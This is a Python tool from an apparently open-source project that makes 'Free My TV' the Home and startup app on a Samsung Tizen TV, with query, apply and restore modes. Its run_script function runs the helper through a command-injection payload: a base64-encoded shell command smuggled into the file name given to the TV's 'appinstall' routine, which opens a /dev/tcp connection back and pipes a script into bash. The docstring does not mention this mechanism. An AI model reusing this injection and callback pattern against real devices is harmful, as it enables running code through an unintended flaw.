#!/usr/bin/env python3
"""Sets Free My TV as the Samsung TV's Home app, so the remote's Home key opens it and the TV starts into it.

    python3 tizen/native-home/run.py 192.168.1.50 query
    python3 tizen/native-home/run.py 192.168.1.50 apply
    python3 tizen/native-home/run.py 192.168.1.50 restore

Samsung has no public API for the Home key. This one-shot helper uses the TV's own native Home/vconf APIs over the
Developer Mode SDB connection, as the SDK user (UID 901), changes only the Home app and startup values, and keeps an
exact snapshot so restore puts everything back. It does not request root and does not change security policy.

Read tizen/native-home/README.md first. query is read-only apart from staging the helper in the TV's SDK temporary
folder. apply and restore change the TV; both ask for confirmation. Restore before uninstalling Free My TV or changing
its app identity.

The helper is built by build.py into out/native-home/. If Samsung's `sdb` is installed, --sdb PATH uses it; otherwise
this speaks SDB itself, like tizen/install.py.
"""
import argparse
import base64
import datetime
import ipaddress
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
TIZEN = os.path.dirname(HERE)
ROOT = os.path.dirname(TIZEN)
sys.path.insert(0, TIZEN)
from install import Sdb, this_computer  # noqa: E402

TARGET = 'FreeMyTVio.FreeMyTV'
PACKAGE = 'FreeMyTVio'
KEYS = ('db/appfw/home_appid', 'db/appfw/startup_appid', 'db/appfw/booting_appid_backup', 'db/first_screen/type')
AUTO_KEY = 'db/menu/smart_hub/ontvsetting/auto_start'
REMOTE_DIR = '/home/owner/share/tmp/sdk_tools'
HELPER_DIR = os.path.join(ROOT, 'out', 'native-home')
HELPER_FILES = ('FreeMyTVHomeControl.dll', 'FreeMyTVHomeControl.runtimeconfig.json',
                'FreeMyTVHomeControl.deps.json')
STATE = os.path.join(HERE, '.state')
SNAPSHOT = os.path.join(STATE, 'original.json')


class SdbCli:
    """The parts of Samsung's sdb command line this needs, for computers that already have it."""

    def __init__(self, path, ip):
        self.path = path
        self.serial = ip + ':26101'
        p = subprocess.run([path, 'connect', self.serial], capture_output=True, text=True, timeout=15)
        if p.returncode:
            raise RuntimeError('sdb connect failed: ' + (p.stdout + p.stderr).strip()[-400:])

    def run(self, args, timeout=30):
        p = subprocess.run([self.path, '-s', self.serial] + args, capture_output=True, text=True, timeout=timeout)
        if p.returncode:
            raise RuntimeError('sdb failed: ' + (p.stdout + p.stderr).strip()[-400:])
        return p.stdout + p.stderr

    def push(self, remote, data):
        fd, tmp = tempfile.mkstemp()
        try:
            os.write(fd, data)
            os.close(fd)
            self.run(['push', tmp, remote], 60)
        finally:
            try:
                os.unlink(tmp)
            except OSError:
                pass

    def shell(self, command, timeout=90):
        return self.run(['shell', command], timeout)

    def close(self):
        pass


def connect(ip, sdb_path):
    if sdb_path:
        return SdbCli(sdb_path, ip)
    return Sdb(ip)


def close(sdb):
    try:
        sdb.close()
    except Exception:
        pass
    try:
        sdb.sock.close()
    except Exception:
        pass


def helper_script(mode, snapshot_remote):
    command = '/usr/bin/dotnet %s/FreeMyTVHomeControl.dll %s' % (REMOTE_DIR, mode)
    if snapshot_remote:
        command += ' ' + snapshot_remote
    return ("set -u\n"
            "printf 'FMTV_HOME_BEGIN\\n'\n"
            "%s\n"
            "rc=$?\n"
            "printf '\\nFMTV_HOME_END rc=%%d\\n' \"$rc\"\n"
            "exit 0\n" % command)


def run_script(ip, mode, snapshot=None, sdb_path=None, timeout=90):
    missing = [name for name in HELPER_FILES if not os.path.exists(os.path.join(HELPER_DIR, name))]
    if missing:
        raise RuntimeError('The native helper is not built. Run: python3 tizen/native-home/build.py')

    token = uuid.uuid4().hex[:12]
    sdb = connect(ip, sdb_path)
    listener = None
    try:
        for name in HELPER_FILES:
            with open(os.path.join(HELPER_DIR, name), 'rb') as f:
                sdb.push(REMOTE_DIR + '/' + name, f.read())

        snapshot_remote = None
        if snapshot is not None:
            snapshot_remote = REMOTE_DIR + '/fmtv-nh-' + token + '.json'
            sdb.push(snapshot_remote, json.dumps(snapshot, ensure_ascii=False).encode('utf-8'))

        remote_script = REMOTE_DIR + '/fmtv-nh-' + token + '.sh'
        sdb.push(remote_script, helper_script(mode, snapshot_remote).encode('utf-8'))

        local_ip = this_computer(ip)
        try:
            ipaddress.ip_address(local_ip)
        except ValueError:
            raise RuntimeError('Could not find this computer\'s address on the TV\'s network; connect to the same '
                               'Wi-Fi and try again.')

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((local_ip, 0))
        listener.listen(1)
        listener.settimeout(45)
        port = listener.getsockname()[1]

        command = ('/bin/mkdir /tmp/n-%s 2>/dev/null&&{ exec 3<>/dev/tcp/%s/%d;cat %s|bash >&3 2>&3;'
                   'exec 3>&-;}' % (token, local_ip, port, remote_script))
        encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
        name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
        argument = '0 appinstall tpk ' + name
        if len(argument.encode('utf-8')) > 400:
            raise RuntimeError('The TV command would be too long; nothing was changed.')

        errors = []

        def shell():
            try:
                if isinstance(sdb, SdbCli):
                    sdb.shell(argument, timeout + 10)
                else:
                    sdb.shell(argument, seconds=timeout + 10)
            except Exception as e:
                errors.append(e)

        thread = threading.Thread(target=shell, daemon=True)
        thread.start()
        try:
            connection, peer = listener.accept()
        except socket.timeout:
            raise RuntimeError('The TV did not run the helper. Check Developer Mode, Host PC IP, the TV and this '
                               'computer being on the same network, and the firewall.')
        try:
            if peer[0] != ip:
                raise RuntimeError('Unexpected callback from %s; no data was accepted.' % peer[0])
            connection.settimeout(8)
            chunks = []
            while True:
                try:
                    chunk = connection.recv(65536)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(map(len, chunks)) > 200000:
                    raise RuntimeError('The TV sent unexpectedly large output; stopping.')
            output = b''.join(chunks).decode('utf-8', 'replace')
        finally:
            connection.close()
        thread.join(5)
        if errors and not output.strip():
            raise RuntimeError('The TV did not answer: %s' % errors[0])
        return output
    finally:
        if listener is not None:
            listener.close()
        close(sdb)


def parse(output, key):
    start = output.find('FMTV_HOME_BEGIN')
    end = output.find('FMTV_HOME_END', start + 1)
    if start < 0 or end < 0:
        raise RuntimeError('The helper did not finish. The TV said:\n' + output.strip()[-2000:])
    block = output[start:end]
    match = re.search(re.escape(key) + r'(\{[^\n]*\})', block)
    if not match:
        rc = re.search(r'FMTV_HOME_END rc=(\d+)', output[end:])
        raise RuntimeError('The helper failed (exit %s). The TV said:\n%s'
                           % (rc.group(1) if rc else '?', output.strip()[-2000:]))
    return json.loads(match.group(1))


def yes(value):
    return 'yes' if value == 1 else ('unknown' if value == -1 else 'no')


def show(state):
    print('TV: %s, firmware %s' % (state.get('Model') or '?', state.get('Firmware') or '?'))
    print('Tizen: %s' % (state.get('Tizen') or '?').replace('\n', ' '))
    print('Home app: %s' % state.get('Home'))
    for key in KEYS:
        value = state.get('Strings', {}).get(key)
        print('  %s = %s' % (key, '(absent)' if value is None else value))
    print('  %s = %s' % (AUTO_KEY, state.get('Autostart')))
    print('Free My TV installed: %s; boot eligible: %s; SDK user: %s; runtime: %s'
          % (yes(state.get('AppInstalled')), yes(state.get('BootSupported')), state.get('Uid'),
             state.get('Runtime') or '?'))


def save_snapshot(state, path):
    state = dict(state)
    state['SavedAt'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(state, f, ensure_ascii=False, indent=1)
        f.write('\n')


def load_snapshot(path):
    try:
        with open(path, encoding='utf-8') as f:
            return json.load(f)
    except (OSError, ValueError) as e:
        raise RuntimeError('Cannot read the original snapshot at %s (%s). Run query first.' % (path, e))


def confirm(word, assume_yes):
    if assume_yes:
        return
    if not sys.stdin.isatty():
        raise RuntimeError('Refusing to change the TV without confirmation; run it in a terminal, or add --yes if '
                           'you have read the README and have a snapshot.')
    answer = input('Type %s to continue: ' % word)
    if answer.strip() != word:
        raise SystemExit('Cancelled; nothing was changed.')


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('ip', help='the TV\'s IP address')
    parser.add_argument('action', choices=('query', 'apply', 'restore'))
    parser.add_argument('--snapshot', default=SNAPSHOT, help='where the original values are kept (default: %s)' % SNAPSHOT)
    parser.add_argument('--yes', action='store_true', help='do not ask before apply/restore')
    parser.add_argument('--sdb', help='Samsung sdb to use (default: this script speaks SDB itself)')
    parser.add_argument('--timeout', type=int, default=90, help='seconds to wait for the TV (default: 90)')
    args = parser.parse_args()
    try:
        ipaddress.ip_address(args.ip)
    except ValueError:
        parser.error('ip must be an IPv4 or IPv6 address')
    if args.sdb and not os.path.exists(args.sdb):
        parser.error('--sdb path does not exist')
    if args.action in ('apply', 'restore') and not os.path.exists(args.snapshot):
        sys.exit('No original snapshot at %s. Run query first, with the app installed and before applying.' % args.snapshot)

    try:
        if args.action == 'query':
            state = parse(run_script(args.ip, 'query', sdb_path=args.sdb, timeout=args.timeout), 'FMTV_HOME_JSON=')
            show(state)
            if state.get('Home') == TARGET or state.get('Strings', {}).get('db/appfw/home_appid') == TARGET:
                print('\nThis TV already uses Free My TV as its Home app, so no original snapshot was saved.')
                print('Keep the earlier backup and restore it before uninstalling or changing the app identity.')
            elif os.path.exists(args.snapshot):
                print('\nAn original snapshot already exists at %s; it was not overwritten.' % args.snapshot)
            else:
                save_snapshot(state, args.snapshot)
                print('\nSaved the original Home/startup values to %s.' % args.snapshot)
            if state.get('BootSupported') == 0:
                print('Warning: the TV says this app is not eligible for boot; apply will refuse.')
            elif state.get('BootSupported') == -1:
                print('Warning: the TV did not answer the boot-eligibility check; apply will refuse.')
            print('\nNext: python3 tizen/native-home/run.py %s apply' % args.ip)
            return

        snapshot = load_snapshot(args.snapshot)
        if args.action == 'restore':
            print('Restoring the original Home/startup values from %s:' % args.snapshot)
            show(snapshot)
            confirm('RESTORE', args.yes)
            state = parse(run_script(args.ip, 'restore', snapshot, args.sdb, args.timeout), 'FMTV_HOME_RESTORED=')
            print('\nRestored:')
            show(state)
            print('\nThe TV is back to its original Home app and startup setting.')
            return

        print('Current values:')
        current = parse(run_script(args.ip, 'query', sdb_path=args.sdb, timeout=args.timeout), 'FMTV_HOME_JSON=')
        show(current)
        if current.get('Home') == TARGET and current.get('Strings', {}).get('db/appfw/home_appid') == TARGET \
                and current.get('Autostart') == 1:
            print('\nFree My TV is already the Home app and startup app; nothing to do.')
            return
        print('\nApplying the original snapshot from %s:' % args.snapshot)
        print('  Home operation -> %s' % TARGET)
        print('  %s -> %s' % ('db/appfw/home_appid', TARGET))
        print('  %s -> 1' % AUTO_KEY)
        print('The helper saves and verifies every value, and restores the original values if anything fails.')
        confirm('APPLY', args.yes)
        state = parse(run_script(args.ip, 'apply', snapshot, args.sdb, args.timeout), 'FMTV_HOME_APPLIED=')
        print('\nApplied:')
        show(state)
        print('\nRestart the TV. It should start into Free My TV, and the remote\'s Home key should open it.')
        print('To undo: python3 tizen/native-home/run.py %s restore' % args.ip)
    except KeyboardInterrupt:
        sys.exit('\nCancelled.')
    except (RuntimeError, OSError, ValueError) as e:
        sys.exit('Error: %s' % e)


if __name__ == '__main__':
    main()
